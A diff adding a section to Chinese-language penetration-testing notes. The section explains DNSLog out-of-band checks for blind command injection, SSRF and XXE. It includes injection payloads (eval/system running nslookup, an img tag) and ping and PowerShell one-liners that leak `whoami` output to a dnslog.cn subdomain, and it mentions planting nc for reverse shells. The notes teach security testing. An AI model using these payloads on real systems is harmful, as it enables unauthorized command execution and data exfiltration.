@@ -323,6 +323,29 @@ echo "Hello, `whoami`. You are currently in `pwd`."
 
 如果对方是 windows 系统的话，你就可以给它上传一个 nc ，然后如果对方有防火墙策略的话：有入站策略可以采用反向连接，有出站策略的话可以采用正向连接
 
+**使用dnslog解决数据回传问题的特殊策略**：
+
+DNSLog 是一个用于接收和记录 DNS 查询请求的平台，不过你也可以用它来帮助检测那些无法直接获取回显结果的“盲”型漏洞。
+
+1. 获取子域名：你访问 DNSLog 平台（如 `dnslog.cn`），它会给你分配一个唯一的子域名，例如 `abc123.dnslog.cn`。
+2. 构造载荷（Payload）：在测试目标时，你让目标系统去访问一个由这个子域名衍生的地址。例如：
+    - 让服务器发起 DNS 请求：`ping sub.abc123.dnslog.cn`        
+    - 让服务器加载一个资源：`<img src="http://sub.abc123.dnslog.cn">`
+    - 在漏洞利用中注入：`/blind.php?code=eval($_REQUEST['cmd']);&cmd=system('nslookup sub.abc123.dnslog.cn');`        
+3. 触发查询：如果目标系统存在漏洞（如命令注入、SSRF、盲注XXE等），它就会执行你嵌入的指令，向 `sub.abc123.dnslog.cn` 发起 DNS 查询。
+4. 接收记录：这个查询请求会经过互联网的 DNS 系统层层解析，最终到达 `dnslog.cn` 的权威 DNS 服务器。该平台会记录下所有来自你子域名的查询请求。
+5. 验证漏洞：你刷新 DNSLog 平台的页面，如果看到一条关于 `sub.abc123.dnslog.cn` 的查询记录，就证明目标系统成功执行了你的指令，漏洞真实存在！
+
+```shell
+ping `语句`.abc123.dnslog.cn
+# windows 系统的 cmd 中没有 `` ，可以使用 powershel 执行以下命令
+$x=whoami;  $y='.abc123.dnslog.cn'
+ping $x+$y
+# 但是 windows 管理员的权限执行 whoami 后会得到一个有反斜杠的结果（类似于 EGB\administrator 这样的），所以……
+$xx=$x.replace('\', 'xxxx'); # 把反斜杠替换掉就好了
+ping $xx'.abc123.dnslog.cn'
+```
+
 # 相关术语
 
 *肉鸡*
